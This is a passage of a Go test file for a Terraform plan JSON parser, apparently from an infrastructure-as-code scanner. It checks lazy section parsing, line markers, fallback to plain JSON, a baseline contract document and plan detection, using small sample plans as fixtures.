	data, ok := (&Parser{}).ParseLineInfoSection(content, "plan.json", "data")
	require.True(t, ok)
	require.JSONEq(t, mustJSON(t, whole["data"]), mustJSON(t, data))
	for _, name := range []string{"resource", "configuration", "missing"} {
		_, ok = (&Parser{}).ParseLineInfoSection(content, "plan.json", name)
		require.False(t, ok, "%s is not a lazy section", name)
	}
	_, ok = (&Parser{}).ParseLineInfoSection([]byte(`{"Resources": {}}`), "plan.json", "resource_changes")
	require.False(t, ok, "other JSON has none")

	_, ok = (&Parser{}).ParseLineInfo([]byte(`{"Resources": {}}`), "plan.json")
	require.False(t, ok, "other JSON is parsed whole")

	// A plan value naming a file is resolved by the full parse only.
	plan := filepath.FromSlash("/scan/plan.json")
	p := &Parser{FS: vfs.NewMemFS(map[string][]byte{filepath.FromSlash("/scan/policy.json"): []byte(`{}`)})}
	withFile := strings.Replace(sectionsPlan, `"logs-planned"`, `"policy.json"`, 1)
	_, ok = p.ParseLineInfo([]byte(withFile), plan)
	require.False(t, ok, "a plan referencing a file is parsed whole")
	_, ok = p.ParseLineInfoSection([]byte(withFile), plan, "resource_changes")
	require.False(t, ok, "its whole parse already holds every section")
}

// TestParse_tfplanHeaderLinesFollowTheirSection checks that a resource that
// already exists points at its planned values, which rules read, rather than
// at its prior state, that a data source points at its prior state, and that
// resources of child modules have header lines too.
func TestParse_tfplanHeaderLinesFollowTheirSection(t *testing.T) {
	content := []byte(sectionsPlan)
	_, docs, _, _, err := (&Parser{}).Parse(context.Background(), content, "plan.json", false, 15)
	require.NoError(t, err)
	doc := docs[0]

	// Each "values" key sits on the line above its first attribute.
	headerLine := func(firstAttribute string) float64 {
		i := strings.Index(sectionsPlan, firstAttribute)
		require.GreaterOrEqual(t, i, 0, firstAttribute)
		return float64(strings.Count(sectionsPlan[:i], "\n"))
	}
	lineOf := func(section, typ, key string) interface{} {
		lines := doc[section].(map[string]interface{})[typ].(map[string]interface{})["_dd_lines"]
		return lines.(map[string]interface{})["_dd_"+key].(map[string]interface{})["_dd_line"]
	}
	require.Equal(t, headerLine(`"bucket": "logs-planned"`), lineOf("resource", "aws_s3_bucket", "logs"))
	require.Equal(t, headerLine(`"bucket": "app-eu"`), lineOf("resource", "aws_s3_bucket", `module.app.logs["eu"]`))
	require.Equal(t, headerLine(`"json": "{}"`), lineOf("data", "aws_iam_policy_document", "read"))
	require.NotContains(t, doc["data"].(map[string]interface{})["aws_iam_policy_document"], "old",
		"a data source being deleted is not read from prior_state")
}

func TestParse_tfplanFallsBackToWholeParse(t *testing.T) {
	for name, content := range map[string]string{
		"repeated section":         `{"format_version": "1.2", "planned_values": {"root_module": {}}, "planned_values": {"root_module": {}}}`,
		"unsupported version":      `{"format_version": "9.0", "planned_values": {"root_module": {}}}`,
		"planned_values not a map": `{"format_version": "1.2", "planned_values": [], "x": 1}`,
		"no root module":           `{"format_version": "1.2", "planned_values": {}, "configuration": []}`,
	} {
		t.Run(name, func(t *testing.T) {
			_, ok := parseTFPlanContent([]byte(content))
			require.False(t, ok)
			_, ok = parseTFPlanLineInfo([]byte(content))
			require.False(t, ok)
		})
	}
	// A plan without a root module stays a plain JSON document instead of
	// panicking.
	_, docs, _, _, err := (&Parser{}).Parse(context.Background(),
		[]byte(`{"format_version": "1.2", "planned_values": {}, "configuration": []}`), "plan.json", false, 15)
	require.NoError(t, err)
	require.NotContains(t, docs[0], "resource")
	// An unsupported plan stays a plain JSON document, as before.
	_, docs, _, _, err = (&Parser{}).Parse(context.Background(),
		[]byte(`{"format_version": "9.0", "planned_values": {"root_module": {}}}`), "plan.json", false, 15)
	require.NoError(t, err)
	require.Contains(t, docs[0], "planned_values")
	require.NotContains(t, docs[0], "resource")
}

func mustJSON(t *testing.T, v interface{}) string {
	t.Helper()
	b, err := json.Marshal(v)
	require.NoError(t, err)
	return string(b)
}

func keysOf(doc model.Document) []string {
	keys := make([]string, 0, len(doc))
	for k := range doc {
		keys = append(keys, k)
	}
	return keys
}

// The expected evaluation document was produced by main at 221479ff2,
// independently of both parser paths below. Line-marker changes are tested
// separately: the rule-facing document must keep the existing contract.
func TestTFPlanEvaluationContractMatchesMain(t *testing.T) {
	baseline, err := os.ReadFile("testdata/tfplan_eval_contract.json")
	require.NoError(t, err)
	var expected []model.Document
	require.NoError(t, json.Unmarshal(baseline, &expected))
	require.Len(t, expected, 1)
	for name, content := range map[string][]byte{
		"indented": []byte(sectionsPlan),
		"minified": compactPlan(t),
	} {
		t.Run(name, func(t *testing.T) {
			p := &Parser{}
			_, annotated, _, _, err := p.Parse(context.Background(), content, "plan.json", false, 15)
			require.NoError(t, err)
			require.Len(t, annotated, 1)
			require.JSONEq(t, mustJSON(t, expected[0]), withoutLineMarkers(t, annotated[0]))
			light, ok := p.ParseUnannotated(content, "plan.json")
			require.True(t, ok)
			require.Len(t, light, 1)
			require.JSONEq(t, mustJSON(t, expected[0]), mustJSON(t, light[0]))
		})
	}
}

// Compare every data value and marker with the whole parse across module,
// index, deletion and serialization-order variants.
func TestLazyDataLineInfoMatchesWholeParse(t *testing.T) {
	var plan map[string]interface{}
	require.NoError(t, json.Unmarshal([]byte(sectionsPlan), &plan))
	prior := plan["prior_state"].(map[string]interface{})["values"].(map[string]interface{})
	root := prior["root_module"].(map[string]interface{})
	values := map[string]interface{}{
		"name":            "web",
		"securityContext": map[string]interface{}{"capabilities": map[string]interface{}{"add": []interface{}{"NET_ADMIN", "SYS_ADMIN"}}},
		"heterogeneous":   []interface{}{map[string]interface{}{"a": 1}, nil, map[string]interface{}{"b": []interface{}{"x", "y"}}},
	}
	resource := func(address, name string, index interface{}) map[string]interface{} {
		r := map[string]interface{}{"address": address, "mode": "data", "type": "kubernetes_pod", "name": name, "values": values}
		if index != nil {
			r["index"] = index
		}
		return r
	}
	root["child_modules"] = []interface{}{
		map[string]interface{}{"address": "module.z", "resources": []interface{}{resource("data.kubernetes_pod.indexed[0]", "indexed", 0)}},
		map[string]interface{}{"address": "module.a", "child_modules": []interface{}{
			map[string]interface{}{"address": "module.a.module.nested", "resources": []interface{}{
				resource("data.kubernetes_pod.each", "each", "eu.]"),
			}},
		}},
	}
	root["resources"] = append(root["resources"].([]interface{}), resource("data.kubernetes_pod.root", "root", nil))
	// Children serialize before root resources, and the explicit traversal's
	// stack visits sibling modules in reverse order.
	content, err := json.MarshalIndent(plan, "", "  ")
	require.NoError(t, err)
	for name, content := range map[string][]byte{
		"indented": content,
		"minified": func() []byte { b, e := json.Marshal(plan); require.NoError(t, e); return b }(),
	} {
		t.Run(name, func(t *testing.T) {
			p := &Parser{}
			_, whole, _, _, err := p.Parse(context.Background(), content, "plan.json", false, 15)
			require.NoError(t, err)
			section, ok := p.ParseLineInfoSection(content, "plan.json", "data")
			require.True(t, ok)
			require.JSONEq(t, mustJSON(t, whole[0]["data"]), mustJSON(t, section))
			data := section.(map[string]interface{})
			require.NotContains(t, data["aws_iam_policy_document"], "old", "deleted data stays excluded")
			require.NotContains(t, data, "aws_s3_bucket", "managed prior state stays excluded")
		})
	}
}

// Check the complete detector-visible projection, including every optional
// section, rather than maintaining an allowlist of only the common paths.
func TestReducedPlanLineInfoCoversWholeDetectorDocument(t *testing.T) {
	p := &Parser{}
	content := []byte(sectionsPlan)
	_, whole, _, _, err := p.Parse(context.Background(), content, "plan.json", false, 15)
	require.NoError(t, err)
	reduced, ok := p.ParseLineInfo(content, "plan.json")
	require.True(t, ok)
	for _, name := range lazyLineInfoSections {
		section, ok := p.ParseLineInfoSection(content, "plan.json", name)
		if ok {
			reduced[0][name] = section
		}
	}
	expected := whole[0]
	delete(expected, TfplanMetaKey) // detector deliberately skips metadata
	require.JSONEq(t, mustJSON(t, expected), mustJSON(t, reduced[0]))
}

func TestLazyDataLineInfoHandlesAbsentValues(t *testing.T) {
	for name, suffix := range map[string]string{"missing": "", "null": `,"values":null`, "empty": `,"values":{}`} {
		t.Run(name, func(t *testing.T) {
			content := []byte(`{"format_version":"1.2","planned_values":{"root_module":{}},
"prior_state":{"format_version":"1.0","values":{"root_module":{"resources":[
{"address":"data.test.a","mode":"data","type":"test","name":"a"` + suffix + `}]}}}}`)
			p := &Parser{}
			_, whole, _, _, err := p.Parse(context.Background(), content, "plan.json", false, 15)
			require.NoError(t, err)
			section, ok := p.ParseLineInfoSection(content, "plan.json", "data")
			require.True(t, ok)
			require.JSONEq(t, mustJSON(t, whole[0]["data"]), mustJSON(t, section))
		})
	}
}

func BenchmarkPriorDataLineInfo(b *testing.B) {
	for _, count := range []int{100, 1000} {
		resources := make([]interface{}, 0, count)
		for i := range count {
			name := fmt.Sprintf("entry_%d", i)
			resources = append(resources, map[string]interface{}{
				"address": "data.test." + name, "mode": "data", "type": "test", "name": name,
				"values": map[string]interface{}{"value": name, "items": []string{"a", "b"}},
			})
		}
		plan := map[string]interface{}{
			"format_version": "1.2",
			"planned_values": map[string]interface{}{"root_module": map[string]interface{}{}},
			"prior_state": map[string]interface{}{"format_version": "1.0", "values": map[string]interface{}{
				"root_module": map[string]interface{}{"resources": resources},
			}},
		}
		content, err := json.MarshalIndent(plan, "", "  ")
		if err != nil {
			b.Fatal(err)
		}
		b.Run(fmt.Sprint(count), func(b *testing.B) {
			p := &Parser{}
			b.SetBytes(int64(len(content)))
			b.ReportAllocs()
			for b.Loop() {
				if _, ok := p.ParseLineInfoSection(content, "plan.json", "data"); !ok {
					b.Fatal("missing data")
				}
			}
		})
	}
}

func TestLazyDataLineInfoDoesNotRetainInputViews(t *testing.T) {
	content := []byte(sectionsPlan)
	data, ok := (&Parser{}).ParseLineInfoSection(content, "plan.json", "data")
	require.True(t, ok)
	expected := mustJSON(t, data)
	clear(content)
	require.JSONEq(t, expected, mustJSON(t, data), "returned keys and values must own their bytes")
}

// TestParsePlanReportsPlan checks that a plan is reported as parsed as a plan
// by both parse paths, and that content that only looks like a plan, which
// falls back to a plain JSON document, is not.
func TestParsePlanReportsPlan(t *testing.T) {
	tests := []struct {
		name    string
		content string
		isPlan  bool
	}{
		{
			name: "plan",
			content: `{"format_version": "1.0", "planned_values": {"root_module": {"resources": [
				{"address": "aws_s3_bucket.main", "type": "aws_s3_bucket", "name": "main", "values": {"acl": "private"}}]}}}`,
			isPlan: true,
		},
		{name: "plan markers without resources", content: `{"format_version": "1.0", "planned_values": {}}`},
		{
			name:    "nested plan markers under a top-level resource map",
			content: `{"resource": {}, "plan": {"format_version": "1.0", "planned_values": {}}}`,
		},
		{name: "plain JSON", content: `{"key": "value"}`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := &Parser{}
			_, ok := p.ParseUnannotated([]byte(tt.content), "file.json")
			require.Equal(t, tt.isPlan, ok)

			out, err := p.ParsePlan(context.Background(), []byte(tt.content), "file.json", false, 15)
			require.NoError(t, err)
			require.Len(t, out.Documents, 1)
			require.Equal(t, tt.isPlan, out.TerraformPlan)
		})
	}
}
